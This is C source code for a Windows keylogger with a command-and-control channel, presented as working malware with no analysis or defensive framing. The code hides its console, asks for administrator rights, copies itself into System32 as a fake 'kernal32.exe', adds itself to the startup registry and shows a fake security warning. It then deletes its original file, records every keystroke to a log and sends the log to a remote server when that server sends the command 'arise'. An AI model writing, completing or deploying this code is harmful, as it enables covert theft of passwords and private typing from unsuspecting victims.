#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>


#define SERVER_IP "192.168.1.14"  // Change this to the Linux server IP
#define SERVER_PORT 2005
#define BUF_SIZE 4096

#define SYSTEM32_PATH "C:\\Windows\\System32\\kernal32.exe"

int connection = 0;
SOCKET sock;
HANDLE hMutex;
struct sockaddr_in server;
DWORD WINAPI send_logs(LPVOID lpBuffer) {
    FILE *fp;
    char *filename = "log.txt";
    char buffer[BUF_SIZE];
    int bytes_sent;
    SOCKET sock = *(SOCKET*)lpBuffer;

    if ((fp = fopen(filename, "r")) == NULL) {
        printf("Error opening file\n");
        return -1;
    }
    while ((bytes_sent = fread(buffer, sizeof(char), BUF_SIZE, fp)) > 0) {
        send(sock, buffer, bytes_sent, 0);
    }
    fclose(fp);
    
    return 1;
}


void refresh_connection() {
    while(1){
        closesocket(sock);
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = inet_addr(SERVER_IP);
        server.sin_port = htons(SERVER_PORT);
        int retries = 10;
        while(connect(sock, (struct sockaddr *)&server, sizeof(server))){
            if(!retries--) continue;
            Sleep(5000); // Wait 5 seconds before trying again
        }
        return;
    }
}


DWORD WINAPI connect_to_server(LPVOID arg) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    char buffer[BUF_SIZE];
    hMutex = CreateMutex(NULL,FALSE,NULL);
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_port = htons(SERVER_PORT);
    // connect(sock, (struct sockaddr *)&server, sizeof(server));
    HANDLE recieve, refresh_conn;
    // refresh_conn = CreateThread(NULL, 0, refresh_connection, NULL, NULL, NULL);
    int len = 0;
    while(1 > 0) {

        // Then, modify your recv() call to handle the non-blocking behavior
        if((len = recv(sock, buffer, sizeof(buffer), 0)) <= 0){
            refresh_connection();
            continue;
        }
        buffer[len] = '\0';
        if (strcmp(buffer, "arise") == 0) {
            recieve = CreateThread(NULL, 0, send_logs, &sock, NULL, NULL);
        }
    }
        // Cleanup
    closesocket(sock);
    WSACleanup();
    return 1;
}
// Function to save logs to a file
HANDLE fileMutex;

void save_to(const char *filename, const char *message) {
    WaitForSingleObject(fileMutex, INFINITE);
    FILE *fp = fopen(filename, "a");
    if (fp) {
        fprintf(fp, "%s", message);
        fclose(fp);
    } else {
        printf("Error opening file: %s\n", strerror(errno));
    }
    ReleaseMutex(fileMutex);
}



// Map special keys with Shift pressed
char map_special_shifted(int key) {
    switch (key) {
        case '1': return '!';
        case '2': return '@';
        case '3': return '#';
        case '4': return '$';
        case '5': return '%';
        case '6': return '^';
        case '7': return '&';
        case '8': return '*';
        case '9': return '(';
        case '0': return ')';
        case '-': return '_';
        case '=': return '+';
        case '[': return '{';
        case ']': return '}';
        case '\\': return '|';
        case ';': return ':';
        case '\'': return '"';
        case ',': return '<';
        case '.': return '>';
        case '/': return '?';
        default: return '\0';
    }
}
void add_to_registry() {
    HKEY hKey;
    char path[MAX_PATH];

    // Get the full path of the current executable
    if (GetModuleFileName(NULL, path, MAX_PATH) == 0) {
        return;
    }

    // Open the registry key where startup programs are listed
    if (RegCreateKeyEx(HKEY_CURRENT_USER, 
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

        // Add the program path to the registry
        RegSetValueEx(hKey, "kernal32", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
    }
}
// Function to copy the executable to System32 folder// Function to copy the executable to System32 folder
void copy_to_system32() {
    char path[MAX_PATH];
    if (GetModuleFileName(NULL, path, MAX_PATH) == 0) {
        return;
    }

    // Path to copy the file into System32
    char destination[MAX_PATH] = "C:\\Windows\\System32\\";
    strcat(destination, "kernal32.exe"); // Change filename if needed

    // Copy file to System32
    if (CopyFile(path, destination, FALSE) == 0) {
        printf("Error copying file: %lu\n", GetLastError());
    }
}

// Function to show a fake popup
void show_fake_popup() {
    MessageBox(NULL, "Your system has detected a potentially harmful file.\nThis file will be deleted for safety.", "Warning", MB_ICONWARNING | MB_OK);
}

// Function to delete the executable from Desktop
void delete_original_executable() {
    char path[MAX_PATH];
    if (GetModuleFileName(NULL, path, MAX_PATH) == 0) {
        return;
    }

    // Delete the file from the desktop (or wherever it was initially located)
    if (DeleteFile(path) == 0) {
        printf("Error deleting file: %lu\n", GetLastError());
    }
}

// Check if it is the first run by checking a registry key
int is_first_run() {
    HKEY hKey;
    DWORD dwType = 0;
    DWORD dwSize = sizeof(DWORD);
    DWORD dwValue = 0;

    // Open the registry key for tracking first run
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\MyApp\\FirstRun", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueEx(hKey, "IsFirstRun", NULL, &dwType, (LPBYTE)&dwValue, &dwSize) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return dwValue == 1 ? 0 : 1; // Not first run if value is 1
        }
        RegCloseKey(hKey);
    }

    // If not found in registry, it's the first run
    return 1;
}

// Mark the application as run so that subsequent runs won't trigger first run behavior
void mark_as_run() {
    HKEY hKey;
    DWORD dwValue = 1;
    RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\MyApp\\FirstRun", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    RegSetValueEx(hKey, "IsFirstRun", 0, REG_DWORD, (LPBYTE)&dwValue, sizeof(dwValue));
    RegCloseKey(hKey);
}

BOOL IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    HANDLE hToken = NULL;
    TOKEN_ELEVATION tokenElevation;
    DWORD dwSize = sizeof(TOKEN_ELEVATION);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        if (GetTokenInformation(hToken, TokenElevation, &tokenElevation, dwSize, &dwSize)) {
            isAdmin = tokenElevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }

    return isAdmin;
}

// Function to relaunch the program as Administrator
void RelaunchAsAdmin() {
    char exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH); // Get the current executable path

    SHELLEXECUTEINFO sei = { sizeof(SHELLEXECUTEINFO) };
    sei.lpVerb = "runas";      // Request "Run as Administrator"
    sei.lpFile = exePath;      // Path to the executable
    sei.nShow = SW_SHOWNORMAL; // Show the window normally

    if (!ShellExecuteEx(&sei)) {
        MessageBox(NULL, "Failed to elevate privileges!", "Error", MB_OK | MB_ICONERROR);
    }
}

// Function to execute the file from System32
void ExecuteFromSystem32() {
    // Execute the file in System32 using ShellExecute
    if (ShellExecute(NULL, "open", SYSTEM32_PATH, NULL, NULL, SW_SHOWNORMAL) <= (HINSTANCE)32) {
        printf("Failed to execute file from System32.\n");
    } else {
        printf("File executed successfully from System32.\n");
    }
}

void DeleteOriginalFile() {
    char path[MAX_PATH];

    // Get full executable path
    if (GetModuleFileName(NULL, path, MAX_PATH) == 0) {
        printf("Failed to get module file name\n");
        return;
    }

    // Construct the command to terminate the process and delete the file
    char command[MAX_PATH * 2];
    snprintf(command, sizeof(command),
             "taskkill /F /IM \"%s\" && del /F /Q \"%s\"", strrchr(path, '\\') + 1, path);

    // Execute the command
    system(command);
}

int main() {
    
    HWND hwnd = GetConsoleWindow(); 
    ShowWindow(hwnd, SW_HIDE); // Hide the window for stealth
    
    fileMutex = CreateMutex(NULL, FALSE, NULL);
        // Check if it is the first run
    if (is_first_run()) {
        // Copy to System32 folder
        // Check if the program is running as administrator
        if (!IsRunningAsAdmin()) {
        // Relaunch the program as administrator if not running as admin
            RelaunchAsAdmin();
            return 0;
        }

    // Once we have elevated privileges:
    // 1. Execute the file from System32
        add_to_registry();
        copy_to_system32();
        show_fake_popup();
        ExecuteFromSystem32();
    // 2. Delete the original file from Desktop (or wherever it was located)
        DeleteOriginalFile();
         mark_as_run();
        // Show fake pop-up
        // Mark as run in the registry so it won't trigger on subsequent runs
        // Ensure the program runs on startup by adding it to the registry
    }

    char message[1024];       // Buffer for logging messages
    int lastKeyState[256] = {0}; // Array to track key states
    CreateThread(NULL, NULL,connect_to_server, NULL, 0, NULL);
    while (1) {
        for (int i = 0; i < 256; i++) {
            // Check if key is pressed
            if (GetAsyncKeyState(i) & 0x0001) {
                // Skip noisy keys that are not typically used
                if (i < 8 || i > 254) continue;

                // Handle alphanumeric keys
                if (i >= 'A' && i <= 'Z') {
                    int capsLock = (GetKeyState(VK_CAPITAL) & 0x0001);
                    int shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000);

                    if (capsLock ^ shiftPressed) { // XOR to determine letter case
                        snprintf(message, sizeof(message), "%c", i); // Uppercase
                    } else {
                        snprintf(message, sizeof(message), "%c", i + 32); // Lowercase
                    }
                }
                // Handle numbers and special characters
                else if (i >= '0' && i <= '9') {
                    if (GetKeyState(VK_SHIFT) & 0x8000) {
                        char shiftedChar = map_special_shifted(i);
                        if (shiftedChar != '\0') {
                            snprintf(message, sizeof(message), "%c", shiftedChar);
                        } else {
                            snprintf(message, sizeof(message), "%c", i); // Default number
                        }
                    } else {
                        snprintf(message, sizeof(message), "%c", i); // Default number
                    }
                }
                // Handle spacebar
                else if (i == VK_SPACE) {
                    strcpy(message, " ");
                }
                // Handle special keys
                else {
                    switch (i) {
                        case VK_RETURN:  strcpy(message, " [Enter] "); break;
                        case VK_BACK:    strcpy(message, " [Backspace] "); break;
                        case VK_TAB:     strcpy(message, " [Tab] "); break;
                        case VK_ESCAPE:  strcpy(message, " [Esc] "); break;
                        case VK_SHIFT:   strcpy(message, " [Shift] "); break;
                        case VK_CONTROL: strcpy(message, " [Ctrl] "); break;
                        case VK_MENU:    strcpy(message, " [Alt] "); break;
                        case VK_CAPITAL: strcpy(message, " [CapsLock] "); break;
                        case VK_LEFT:    strcpy(message, " [Left] "); break;
                        case VK_RIGHT:   strcpy(message, " [Right] "); break;
                        case VK_UP:      strcpy(message, " [Up] "); break;
                        case VK_DOWN:    strcpy(message, " [Down] "); break;
                        case VK_HOME:    strcpy(message, " [Home] "); break;
                        case VK_END:     strcpy(message, " [End] "); break;
                        case VK_DELETE:  strcpy(message, " [Del] "); break;
                        default:
                            snprintf(message, sizeof(message), " [Unknown: %d] ", i);
                            break;
                    }
                }

                // Save the keypress to the log file
                save_to("log.txt" , message);
            }
        }
        Sleep(10); // Reduce CPU usage
    }

    return 0;
}

